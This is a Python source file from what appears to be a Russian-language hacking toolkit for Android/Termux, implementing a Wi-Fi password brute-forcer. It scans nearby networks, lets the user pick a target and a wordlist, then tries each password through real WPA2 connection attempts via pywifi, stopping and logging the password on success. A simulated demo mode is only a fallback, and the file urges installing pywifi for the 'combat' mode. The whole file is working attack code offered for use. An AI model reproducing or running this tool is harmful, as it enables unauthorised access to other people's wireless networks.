# -*- coding: utf-8 -*-
"""
modules.attack.wifi_crack — Подбор пароля от Wi-Fi.

Механика:
  • пользователь выбирает цель (сеть) и словарь;
  • каждый пароль из словаря проверяется подключением к сети,
    шаг подбора — каждые 0.5 секунды;
  • при успехе пароль выводится и подбор останавливается.

Словари лежат в папке wordlists/ проекта:
  pn_e00001.txt  — цифры, easy pass
  pn_h0001.txt   — цифры, hard pass (200k p)
  pn_ea_01.txt   — цифры + буквы

Реальная проверка пароля требует модуля pywifi (работает на Android/Termux
через WiAdapter). Если он недоступен, включается демо-режим симуляции.
"""

import os
import sys
import time

from core.ui import C, header, pause

BASE_DIR = os.path.dirname(os.path.dirname(
    os.path.dirname(os.path.abspath(__file__))))

# Папка со словарями для подбора паролей
WORDLISTS_DIR = os.path.join(BASE_DIR, "wordlists")

DELAY = 0.5  # шаг подбора — каждые 0.5 секунды

DICTIONARIES = [
    ("1. Подбор из цифр (Easy pass)", "pn_e00001.txt"),
    ("2. Подбор из цифр (Hard pass | 200k p)", "pn_h0001.txt"),
    ("3. Подбор паролей из цифр и букв", "pn_ea_01.txt"),
]


def dict_path(fname):
    """Полный путь к файлу словаря в папке wordlists/."""
    return os.path.join(WORDLISTS_DIR, fname)


# ─────────────────── цели (список сетей) ───────────────────

def _get_targets():
    """Возвращает список доступных Wi-Fi сетей: [(ssid, secure), ...]."""
    targets = []
    try:
        import pywifi
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        time.sleep(4)
        for net in iface.scan_results():
            if net.ssid and net.ssid not in [t[0] for t in targets]:
                targets.append((net.ssid, bool(net.key_type)))
        return targets
    except Exception:
        pass

    # Fallback: вывод termux-wifi-scaninfo
    import subprocess
    try:
        out = subprocess.run(["termux-wifi-scaninfo"],
                             capture_output=True, text=True, timeout=10).stdout
        import json
        data = json.loads(out or "[]")
        seen = set()
        for net in data:
            ssid = net.get("SSID") or net.get("ssid")
            if ssid and ssid not in seen:
                seen.add(ssid)
                caps = str(net.get("Security", ""))
                targets.append((ssid, "OPEN" not in caps.upper()))
        if targets:
            return targets
    except Exception:
        pass

    # Крайний вариант: известные сети из конфигурации ОС
    try:
        import glob
        paths = glob.glob("/etc/NetworkManager/system-connections/*.nmconnection") \
            + glob.glob("/etc/NetworkManager/system-connections/*.ini")
        for p in paths:
            with open(p, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if line.strip().startswith("ssid="):
                        ssid = line.strip().split("=", 1)[-1]
                        if ssid:
                            targets.append((ssid, True))
    except Exception:
        pass
    return targets


def _choose_target():
    """Интерактивный выбор сети-цели. Возвращает ssid или None."""
    print(f"{C.CYAN}  Поиск доступных сетей…{C.RESET}")
    targets = _get_targets()
    if not targets:
        print(f"{C.YELLOW}  ⚠ Не удалось получить список сетей автоматически.{C.RESET}")
        ssid = input(f"{C.GREEN}  Введите имя (SSID) сети-цели вручную (Enter — отмена): {C.RESET}").strip()
        return ssid or None

    print()
    print(f"  {C.BOLD}{'№':<4}{'SSID':<28}{'Защита':<10}{C.RESET}")
    print(f"  {'─' * 44}")
    for i, (ssid, secure) in enumerate(targets, 1):
        lock = f"{C.RED}WPA/WPA2{C.RESET}" if secure else f"{C.GREEN}открытая{C.RESET}"
        print(f"  {i:<4}{ssid[:27]:<28}{lock}")
    print()

    while True:
        raw = input(f"{C.GREEN}  Выберите сеть (№ или имя, Enter — отмена): {C.RESET}").strip()
        if not raw:
            return None
        if raw.isdigit() and 1 <= int(raw) <= len(targets):
            return targets[int(raw) - 1][0]
        match = [s for s, _ in targets if s == raw]
        if match:
            return match[0]
        print(f"{C.RED}  ✖ Нет такой сети.{C.RESET}")


def _choose_dictionary():
    """Выбор словаря. Возвращает путь к файлу или None."""
    print()
    print(f"  {C.BOLD}Выберите словарь для подбора:{C.RESET}")
    for name, fname in DICTIONARIES:
        path = dict_path(fname)
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                count = sum(1 for _ in f)
        except FileNotFoundError:
            count = 0
        size = f"{count:,} паролей".replace(",", " ") if count else "файл не найден!"
        print(f"    {C.YELLOW}{name}{C.RESET}  {C.DIM}[wordlists/{fname} · {size}]{C.RESET}")
    print(f"    {C.DIM}0 — Отмена{C.RESET}")
    print()
    while True:
        raw = input(f"{C.GREEN}  Пункт (1-3): {C.RESET}").strip()
        if raw in {"", "0"}:
            return None
        if raw in {"1", "2", "3"}:
            fname = DICTIONARIES[int(raw) - 1][1]
            path = dict_path(fname)
            if os.path.isfile(path):
                return path
            print(f"{C.RED}  ✖ Файл {fname} отсутствует в проекте.{C.RESET}")
            return None
        print(f"{C.RED}  ✖ Неверный пункт.{C.RESET}")


# ─────────────────── реальная атака через pywifi ───────────────────

def _try_connect(iface, ssid, pwd):
    """Одна реальная попытка подключения с паролем pwd."""
    import pywifi
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = pywifi.const.AUTH_ALG_OPEN
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
    profile.key = pwd
    try:
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        steps = max(1, int(DELAY * 10))
        for _ in range(steps):  # короткое ожидание статуса
            time.sleep(0.1)
            if iface.status() == pywifi.const.IFACE_CONNECTED:
                return True
        iface.disconnect()
        time.sleep(0.2)
        return False
    except Exception:
        try:
            iface.disconnect()
        except Exception:
            pass
        return False


def _save_result(ssid, pwd, demo_note=False):
    """Сохраняет итог в logs/wifi_crack.log."""
    log_dir = os.path.join(BASE_DIR, "logs")
    os.makedirs(log_dir, exist_ok=True)
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] цель={ssid} "
    if pwd:
        line += f"пароль={pwd}"
    elif demo_note:
        line += "результат=демо-прогон (без реальной проверки)"
    else:
        line += "результат=пароль не найден"
    with open(os.path.join(log_dir, "wifi_crack.log"), "a",
              encoding="utf-8") as f:
        f.write(line + "\n")
    print(f"{C.DIM}  Итог сохранён в logs/wifi_crack.log{C.RESET}")


def run_attack(ssid, dict_path, demo=False):
    """Основной цикл подбора: по одному паролю каждые 0.5 сек."""
    passwords = []
    with open(dict_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = line.strip()
            if p:
                passwords.append(p)
    total = len(passwords)

    mode_tag = f" {C.DIM}(демо-режим){C.RESET}" if demo else ""
    print()
    print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
    print(f"{C.BOLD}  🎯 Цель: {ssid}{mode_tag}{C.RESET}")
    print(f"{C.BOLD}  📚 Словарь: {os.path.basename(dict_path)} · всего паролей: {total:,}".replace(',', ' ') + C.RESET)
    print(f"{C.BOLD}  ⏱  Шаг подбора: {DELAY} сек{C.RESET}")
    print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
    print(f"{C.DIM}  Ctrl+C — остановить подбор.{C.RESET}\n")

    real_iface = None
    if not demo:
        try:
            import pywifi
            wifi = pywifi.PyWiFi()
            real_iface = wifi.interfaces()[0]
        except Exception:
            real_iface = None
            demo = True
            print(f"{C.YELLOW}  ⚠ pywifi недоступен — включён демо-режим.{C.RESET}\n")

    start = time.time()
    found = None
    try:
        for i, pwd in enumerate(passwords, 1):
            ok = False
            if real_iface is not None:
                ok = _try_connect(real_iface, ssid, pwd)
            else:
                # демо: имитируем проверку с шагом 0.5 сек
                time.sleep(DELAY)

            elapsed = time.time() - start
            speed = i / elapsed if elapsed > 0 else 0
            bar_len = 24
            filled = int(bar_len * i / total)
            bar = "█" * filled + "░" * (bar_len - filled)
            sys.stdout.write(
                f"\r  {C.CYAN}[{bar}]{C.RESET} {i}/{total} "
                f"({i * 100 // total}%) · {pwd[:18]:<18} · {speed:.1f} п/с  "
            )
            sys.stdout.flush()

            if ok:
                found = pwd
                break

            # задержка шага, если реальная проверка прошла быстрее
            if real_iface is not None:
                target_time = start + i * DELAY
                now = time.time()
                if now < target_time:
                    time.sleep(target_time - now)
    except KeyboardInterrupt:
        print(f"\n\n{C.YELLOW}  ⛔ Подбор остановлен пользователем.{C.RESET}")

    print()
    if found:
        print(f"\n{C.GREEN}{C.BOLD}  ✔ ПАРОЛЬ НАЙДЕН: {found}{C.RESET}")
        _save_result(ssid, found)
    elif real_iface is None:
        print(f"\n{C.DIM}  Демо-прогон завершён: реальных подключений не выполнялось."
              f"\n  Для боевого режима установите pywifi (pip install pywifi) и"
              f"\n  запустите с правами, позволяющими менять Wi-Fi соединение.{C.RESET}")
        _save_result(ssid, None, demo_note=True)
    else:
        print(f"\n{C.RED}  ✖ Пароль не найден (словарь исчерпан).{C.RESET}")
        _save_result(ssid, None)


def main(demo=False):
    """Точка входа пункта «Подбор пароля от Wi-Fi»."""
    header("Подбор / Взлом → Подбор пароля от Wi-Fi")

    if demo:
        print(f"{C.YELLOW}  ⚠ Демо-режим: показывается механика подбора,"
              f"\n    реальные подключения к сетям НЕ выполняются.{C.RESET}")

    ssid = _choose_target()
    if not ssid:
        print(f"{C.DIM}  Отменено.{C.RESET}")
        pause()
        return

    dict_path = _choose_dictionary()
    if not dict_path:
        print(f"{C.DIM}  Отменено.{C.RESET}")
        pause()
        return

    run_attack(ssid, dict_path, demo=demo)
    pause()
